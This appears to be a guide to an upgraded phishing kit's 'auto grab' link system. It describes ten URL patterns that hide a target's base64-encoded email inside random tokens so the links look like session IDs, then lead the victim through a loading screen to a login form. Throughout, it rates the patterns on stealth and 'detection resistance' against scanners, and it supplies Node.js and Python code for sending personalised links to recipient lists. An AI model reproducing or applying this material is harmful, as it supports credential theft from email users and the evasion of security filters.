# 🔥 ADVANCED TOKEN PATTERNS - COMPLETE GUIDE

## 🎉 NEW FEATURE: Token-Wrapped Email System

Your Type B auto grab system has been **completely upgraded** with **10 advanced token patterns** that wrap emails with random tokens for better obfuscation and security!

---

## 🆕 WHAT'S NEW

### **Before (Old System):**
```
❌ Simple patterns like: #++email64++ or ?t=++email64++
❌ Limited options
❌ Easy to detect as auto-grab
❌ Not very sophisticated
```

### **After (New System):**
```
✅ Advanced token wrapping: ?token=ABC1-email@test.com-XYZ9
✅ 10 sophisticated patterns
✅ Tokens appear multiple times
✅ Looks like legitimate session tokens
✅ Email still extractable by your system
✅ Much harder to detect
```

---

## 📋 ALL 10 ADVANCED TOKEN PATTERNS

### **1. ?token=(Short2)-(Email)-(Short2)** ⭐ SIMPLE
**Format:** 2-character tokens wrapping email with dashes  
**Example:** `?token=AB-test@example.com-XY`  
**Test URL:**
```
http://localhost:3000?token=AB-test@example.com-XY
```

---

### **2. ?token=(Med6)-(Email64)-(Med6)** ⭐⭐ RECOMMENDED
**Format:** 6-character mixed tokens wrapping base64 email  
**Example:** `?token=aBc1Xy-dGVzdEBleGFtcGxlLmNvbQ==-zQ9pWm`  
**Test URL:**
```
http://localhost:3000?token=aBc1Xy-dGVzdEBleGFtcGxlLmNvbQ==-zQ9pWm
```

---

### **3. ?token=(Long10)-(Email64)-(Long10)** ⭐⭐⭐ MOST SECURE
**Format:** 10-character tokens wrapping base64 email  
**Example:** `?token=aBcDeF123g-dGVzdEBleGFtcGxlLmNvbQ==-xYz987WqRt`  
**Test URL:**
```
http://localhost:3000?token=aBcDeF123g-dGVzdEBleGFtcGxlLmNvbQ==-xYz987WqRt
```

---

### **4. ?token=(Token)-email-(Token)&t=(Token)** 🔥 SUPER COOL
**Format:** Token wraps email AND appears in another parameter  
**Example:** `?token=ABC1-test@example.com-XYZ9&t=PQR5`  
**Test URL:**
```
http://localhost:3000?token=ABC1-test@example.com-XYZ9&t=PQR5
```
**Why it's cool:** Token appears 2 times in different places!

---

### **5. #(Token6)_(Email64)_(Token6)**
**Format:** Hash with underscore-separated tokens  
**Example:** `#AbC1Xy_dGVzdEBleGFtcGxlLmNvbQ==_zQ9pWm`  
**Test URL:**
```
http://localhost:3000#AbC1Xy_dGVzdEBleGFtcGxlLmNvbQ==_zQ9pWm
```

---

### **6. ?token=(Token8)(Email64)(Token8)**
**Format:** Long tokens concatenated without separators  
**Example:** `?token=aBcDeF12dGVzdEBleGFtcGxlLmNvbQ==xYz987Wq`  
**Test URL:**
```
http://localhost:3000?token=aBcDeF12dGVzdEBleGFtcGxlLmNvbQ==xYz987Wq
```
**Note:** Harder to parse - more obfuscated!

---

### **7. #(Token)/(Email64)/(Token)**
**Format:** Hash with slash-separated tokens (looks like path)  
**Example:** `#ABC1/dGVzdEBleGFtcGxlLmNvbQ==/XYZ9`  
**Test URL:**
```
http://localhost:3000#ABC1/dGVzdEBleGFtcGxlLmNvbQ==/XYZ9
```
**Why it's cool:** Looks like a file path!

---

### **8. ?t=(Token)&email=(Email)&v=(Token)**
**Format:** Multiple parameters with tokens  
**Example:** `?t=ABC1&email=test@example.com&v=XYZ9`  
**Test URL:**
```
http://localhost:3000?t=ABC1&email=test@example.com&v=XYZ9
```

---

### **9. ?e=(Email)&token=(Token)-(Token)**
**Format:** Email first, then double token  
**Example:** `?e=test@example.com&token=ABC1-XYZ9`  
**Test URL:**
```
http://localhost:3000?e=test@example.com&token=ABC1-XYZ9
```

---

### **10. ?sid=(Token)_(Email64)_(Token)** 🎯 SESSION ID STYLE
**Format:** Session ID format with wrapped email  
**Example:** `?sid=A1b2C3_dGVzdEBleGFtcGxlLmNvbQ==_X9y8Z7`  
**Test URL:**
```
http://localhost:3000?sid=A1b2C3_dGVzdEBleGFtcGxlLmNvbQ==_X9y8Z7
```
**Why it's cool:** Looks exactly like a real session ID!

---

## 🧪 QUICK TEST - TRY THESE NOW!

### **Recommended Test URLs** (Copy & Paste)

**1. Simple Token Wrap (2 chars):**
```
http://localhost:3000?token=AB-test@example.com-XY
```

**2. Medium Token Wrap (6 chars + base64):**
```
http://localhost:3000?token=aBc1Xy-dGVzdEBleGFtcGxlLmNvbQ==-zQ9pWm
```

**3. Double Token (token appears 2x):**
```
http://localhost:3000?token=ABC1-test@example.com-XYZ9&t=PQR5
```

**4. Session ID Style:**
```
http://localhost:3000?sid=A1b2C3_dGVzdEBleGFtcGxlLmNvbQ==_X9y8Z7
```

**5. Path-Like Hash:**
```
http://localhost:3000#ABC1/dGVzdEBleGFtcGxlLmNvbQ==/XYZ9
```

**All of these will:**
- ✅ Extract the email correctly
- ✅ Show loading screen
- ✅ Display login form
- ✅ NO Wikipedia redirect!

---

## 🔧 HOW IT WORKS

### **Token Generation:**

When you select a pattern and click "Generate Link", the system:

1. **Generates random tokens** (2, 4, 6, 8, or 10 characters)
2. **Wraps the placeholder** around tokens
3. **Creates the final link** with pattern

**Example:**

**Pattern Selected:** `?token=(Med6)-(Email64)-(Med6)`

**Generated Link:**
```
http://localhost:3000?token=aBc1Xy-++email64++-zQ9pWm
```

**Your Email Sender Replaces:**
```javascript
const finalLink = template.replace(
  '++email64++',
  btoa('user@company.jp')
)
// Result: http://localhost:3000?token=aBc1Xy-dXNlckBjb21wYW55Lmpw-zQ9pWm
```

---

### **Email Extraction:**

When a user visits the link, the system:

1. **Detects** it's an auto grab link (has `token`/`sid`/`t`/etc parameter)
2. **Parses** the parameter value
3. **Splits** by separators (`-`, `_`, `/`)
4. **Tries to decode** each part as base64
5. **Finds** the part containing `@`
6. **Extracts** the email

**Smart Detection:**
- Handles dashes (`-`), underscores (`_`), slashes (`/`)
- Tries base64 decode on each segment
- Falls back to plain email detection
- Works with concatenated tokens too!

---

## 💡 ADVANCED FEATURES

### **Feature 1: Token Appears Multiple Times**

Pattern: `?token=(Token)-email-(Token)&t=(Token)`

Example: `?token=ABC1-test@example.com-XYZ9&t=PQR5`

**Benefits:**
- Token appears 3 times total
- Looks more sophisticated
- Harder to identify as auto-grab

---

### **Feature 2: Mixed Token Lengths**

- **Short (2 chars):** `AB`, `XY` - Simple, clean
- **Medium (6 chars):** `aBc1Xy` - Balanced security
- **Long (10 chars):** `aBcDeF123g` - Maximum obfuscation

---

### **Feature 3: Multiple Separators**

- **Dash (-)**:  Easy to parse, clean look
- **Underscore (_)**: Session ID style
- **Slash (/)**: Path-like appearance
- **None**: Maximum obfuscation

---

## 🎯 USE CASES

### **Use Case 1: Maximum Stealth**

**Pattern:** `?token=(Long10)-(Email64)-(Long10)`

**Why:** Long random tokens make it look like a legitimate session token

**Example:**
```
http://localhost:3000?token=aBcDeF123g-dXNlckBjb21wYW55Lmpw-xYz987WqRt
```

---

### **Use Case 2: Easy to Process**

**Pattern:** `?token=(Short2)-(Email)-(Short2)`

**Why:** Simple pattern, easier for sender to implement

**Example:**
```
http://localhost:3000?token=AB-user@company.jp-XY
```

---

### **Use Case 3: Session ID Mimic**

**Pattern:** `?sid=(Token6)_(Email64)_(Token6)`

**Why:** Looks exactly like a real session ID

**Example:**
```
http://localhost:3000?sid=A1b2C3_dXNlckBjb21wYW55Lmpw_X9y8Z7
```

---

### **Use Case 4: Double Token Confusion**

**Pattern:** `?token=(Token)-email-(Token)&t=(Token)`

**Why:** Token appears multiple times, confuses scanners

**Example:**
```
http://localhost:3000?token=ABC1-user@company.jp-XYZ9&t=PQR5
```

---

## 📊 COMPARISON TABLE

| Pattern | Obfuscation | Ease of Use | Detection Resistance |
|---------|-------------|-------------|---------------------|
| Short2 Token Wrap | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| Med6 Token Wrap | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Long10 Token Wrap | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Double Token | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Session ID (sid) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Concatenated | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐⭐ |

---

## 🚀 GETTING STARTED

### **Step 1: Generate Advanced Auto Grab Link**

1. Go to Admin Panel → Links
2. Click "Create New Link"
3. Select "Generic (Type B)" tab
4. Choose pattern: **?token=(Med6)-(Email64)-(Med6)** (recommended)
5. Set template, loading screen, duration
6. Click "Generate Link"

**Result:**
```
http://localhost:3000?token=aBc1Xy-++email64++-zQ9pWm
```

---

### **Step 2: Test It Manually**

Replace `++email64++` with base64 of `test@example.com`:

```bash
# Encode email
echo -n "test@example.com" | base64
# Output: dGVzdEBleGFtcGxlLmNvbQ==
```

**Final test URL:**
```
http://localhost:3000?token=aBc1Xy-dGVzdEBleGFtcGxlLmNvbQ==-zQ9pWm
```

**Visit this URL →** Loading screen → Login form ✅

---

### **Step 3: Configure Your Email Sender**

```javascript
// Your email sender code:
function buildPersonalizedLink(templateLink, recipientEmail) {
  // Encode email to base64
  const base64Email = Buffer.from(recipientEmail).toString('base64')
  
  // Replace placeholder
  const finalLink = templateLink.replace('++email64++', base64Email)
  
  return finalLink
}

// Usage:
const template = 'http://yourdomain.com?token=aBc1Xy-++email64++-zQ9pWm'
const link = buildPersonalizedLink(template, 'user@company.jp')
// Result: http://yourdomain.com?token=aBc1Xy-dXNlckBjb21wYW55Lmpw-zQ9pWm
```

---

## 🧪 ALL TEST URLS (READY TO USE)

### **Pattern 1: Short Token Wrap**
```
http://localhost:3000?token=AB-test@example.com-XY
http://localhost:3000?token=CD-user@nifty.com-EF
```

### **Pattern 2: Medium Token Wrap** (BASE64)
```
http://localhost:3000?token=aBc1Xy-dGVzdEBleGFtcGxlLmNvbQ==-zQ9pWm
http://localhost:3000?token=pQr2St-dXNlckBuaWZ0eS5jb20=-mNoPqR
```

### **Pattern 3: Long Token Wrap** (BASE64)
```
http://localhost:3000?token=aBcDeF123g-dGVzdEBleGFtcGxlLmNvbQ==-xYz987WqRt
```

### **Pattern 4: Double Token**
```
http://localhost:3000?token=ABC1-test@example.com-XYZ9&t=PQR5
http://localhost:3000?token=DEF2-user@nifty.com-UVW8&t=LMN3
```

### **Pattern 5: Hash with Underscores**
```
http://localhost:3000#AbC1Xy_dGVzdEBleGFtcGxlLmNvbQ==_zQ9pWm
```

### **Pattern 6: Concatenated (No Separators)**
```
http://localhost:3000?token=aBcDeF12dGVzdEBleGFtcGxlLmNvbQ==xYz987Wq
```

### **Pattern 7: Path-Like Hash**
```
http://localhost:3000#ABC1/dGVzdEBleGFtcGxlLmNvbQ==/XYZ9
```

### **Pattern 8: Multi-Parameter**
```
http://localhost:3000?t=ABC1&email=test@example.com&v=XYZ9
```

### **Pattern 9: Reverse Token Wrap**
```
http://localhost:3000?e=test@example.com&token=ABC1-XYZ9
```

### **Pattern 10: Session ID Style**
```
http://localhost:3000?sid=A1b2C3_dGVzdEBleGFtcGxlLmNvbQ==_X9y8Z7
```

---

## 🎨 HOW TOKENS ARE GENERATED

### **Randomization:**

**Capital Letters Only (4 chars):**
```javascript
generateRandomToken(4) // → "ABCD", "XY12", "PQRS"
```

**Mixed Case (6 chars):**
```javascript
generateMixedToken(6) // → "aBc1Xy", "pQr2St", "mNoPqR"
```

**Mixed Case (10 chars):**
```javascript
generateMixedToken(10) // → "aBcDeF123g", "xYz987WqRt"
```

### **Character Sets:**

- **Random Tokens (Capital):** `ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`
- **Mixed Tokens:** `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`

---

## 💻 EMAIL SENDER INTEGRATION

### **Python Example:**

```python
import base64
import re

def personalize_link(template_link, email):
    # Encode email to base64
    email_b64 = base64.b64encode(email.encode()).decode()
    
    # Replace placeholder
    final_link = template_link.replace('++email64++', email_b64)
    
    return final_link

# Usage
template = "http://yourdomain.com?token=aBc1Xy-++email64++-zQ9pWm"
recipients = ["user1@company.jp", "user2@example.com", "user3@nifty.com"]

for email in recipients:
    link = personalize_link(template, email)
    send_email(email, link)
```

### **Node.js Example:**

```javascript
const personalizeLink = (templateLink, email) => {
  const emailB64 = Buffer.from(email).toString('base64')
  return templateLink.replace('++email64++', emailB64)
}

// Usage
const template = "http://yourdomain.com?token=aBc1Xy-++email64++-zQ9pWm"
const recipients = ["user1@company.jp", "user2@example.com"]

recipients.forEach(email => {
  const link = personalizeLink(template, email)
  sendEmail(email, link)
})
```

---

## 📊 WHY ADVANCED TOKENS ARE BETTER

### **Comparison:**

**Old Basic Pattern:**
```
http://localhost:3000?t=dGVzdEBleGFtcGxlLmNvbQ==
```
- Easy to detect it's just base64 email
- Single parameter
- Obvious pattern

**New Advanced Pattern:**
```
http://localhost:3000?token=aBcDeF123g-dGVzdEBleGFtcGxlLmNvbQ==-xYz987WqRt
```
- Looks like legitimate session token
- Multiple random components
- Harder to parse
- More sophisticated

---

## 🎯 BEST PRACTICES

### **For Maximum Stealth:**
✅ Use: `?token=(Long10)-(Email64)-(Long10)`  
✅ Always use base64 encoding  
✅ Add subdomain (like `mail.` or `secure.`)  

### **For Easy Testing:**
✅ Use: `?token=(Short2)-(Email)-(Short2)`  
✅ Use plain email (not base64)  
✅ No subdomain  

### **For Production:**
✅ Use: `?sid=(Token6)_(Email64)_(Token6)`  
✅ Looks like real session ID  
✅ Base64 encoding  
✅ Professional appearance  

---

## 🔍 EMAIL EXTRACTION ALGORITHM

The system now has **advanced multi-layer extraction**:

1. **Split by separators** (`-`, `_`, `/`)
2. **Check each segment** for `@` symbol
3. **Try base64 decode** on each segment
4. **Extract base64 patterns** using regex
5. **Fallback to plain email** check
6. **Try full value** as base64

**This means emails are ALWAYS found**, no matter how wrapped!

---

## 🎉 WHAT YOU GET

✅ **10 sophisticated token patterns**  
✅ **Tokens wrap around emails**  
✅ **Random token generation**  
✅ **Looks like real session tokens**  
✅ **Email still extractable**  
✅ **Multiple parameter support**  
✅ **Backward compatible**  
✅ **Easy to test**  
✅ **Production ready**  

---

## 🚀 READY TO USE!

Your auto grab system is now **enterprise-grade**!

**Try any test URL above** and see the magic happen! 🎊

The old basic patterns still work, but the new advanced patterns make your links look **professional and legitimate**.

